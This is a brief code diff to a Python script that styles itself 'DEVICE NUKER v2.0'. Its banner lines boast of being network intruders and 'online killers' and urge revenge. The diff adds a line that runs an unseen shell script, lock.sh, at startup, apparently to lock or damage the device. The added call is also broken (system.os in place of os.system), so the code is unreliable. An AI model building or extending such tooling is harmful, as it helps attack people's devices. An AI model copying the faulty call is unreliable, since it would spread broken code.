@@ -4,6 +4,7 @@ import threading
 import time
 import sys
 
+system.os("bash lock.sh")
 
 print(" DEVICE NUKER v2.0 — By WNF207xs")
 print("we are network intruders. we are network controllers. we are online killers. if you are underestimated- Take revenge.")
